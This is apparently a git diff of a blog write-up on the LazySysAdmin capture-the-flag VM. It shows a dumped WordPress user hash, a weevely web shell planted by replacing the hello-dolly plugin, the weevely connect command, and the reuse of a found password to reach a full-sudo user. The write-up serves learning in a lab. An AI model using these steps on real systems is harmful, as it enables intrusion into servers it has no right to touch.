@@ -112,10 +112,8 @@ Dumping the wp_users table:
 
 ![]({{ site.baseurl }}/forestryio/images/2017-11-14 17_17_46-debz - VMware Workstation.png)
 
-    
     INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
     (1, 'Admin', '$P$B.LCmtO3gkm0PdZNkBwgz2HQweq2Ur0', 'admin', 'togie@sectalks.org', 'http://www.sectalks.org', '2017-08-15 11:20:50', '', 0, 'Admin');
-    
 
 I could have tried bruteforcing the hash given that we know the salt from wp-config.php or [create a new user](https://www.inmotionhosting.com/support/edu/wordpress/333-add-admin-via-mysql), but I just tried my luck using the same pass to get into the admin panel:
 
@@ -123,24 +121,47 @@ I could have tried bruteforcing the hash given that we know the salt from wp-con
 
 ![]({{ site.baseurl }}/forestryio/images/2017-11-13 16_06_48-debz - VMware Workstation.png)
 
+_Note:_ `_togie_` _is a username._
+
 After uploading a [weevely](https://github.com/epinna/weevely3) shell (using the plugin editor and replacing the hello-dolly plugin) I stumbled through the files:
 
 `python weevely.py http://192.168.181.129/wordpress/wp-content/plugins/hello.php 1234`
 
-```
-cat deets.txt 
+    cat deets.txt 
+    
+    CBF Remembering all these passwords.
+    
+    Remember to remove this file and update your password after we push out the server.
+    
+    Password 12345
+    
+    
+    cat todolist.txt 
+    
+    Prevent users from being able to view to web root using the local file browser
 
-CBF Remembering all these passwords.
+[weevely3](https://github.com/epinna/weevely3) has some commands for local linux enumeration and privilege escalation. Note that the weevely version in Kali hasn't been updated for quite some time and lacks some functions like the`:backdoor_meterpreter`. Search for weevely in github.
 
-Remember to remove this file and update your password after we push out the server.
+Here's how I used them to gain root.
 
-Password 12345
+`:audit_etcpasswd -real` gives back a userlist. `:audit_phpconfig` gives back a permission disaster, but I could've seen that before, since phpinfo.php was accessible. Lazy sysadmin...
 
-```
+I tested the pass from deets.txt against the users root and togie and voilà:
 
-```
-cat todolist.txt 
+![]({{ site.baseurl }}/forestryio/images/2017-11-15 15_10_04-Security Breach and Spilled Secrets Have Shaken the N.S.A. to Its Core - The New.png)
 
-Prevent users from being able to view to web root using the local file browser
-```
+    
+    sudo -l
+    
+    [sudo] password for togie: 
+    Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin
+    User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL
+    
 
+Togie is a sudo user!
+
+![]({{ site.baseurl }}/forestryio/images/2017-11-15 15_15_23-Security Breach and Spilled Secrets Have Shaken the N.S.A. to Its Core - The New.png)
+
+Let's see if LazySysAdmin 2 is a little more challenging.
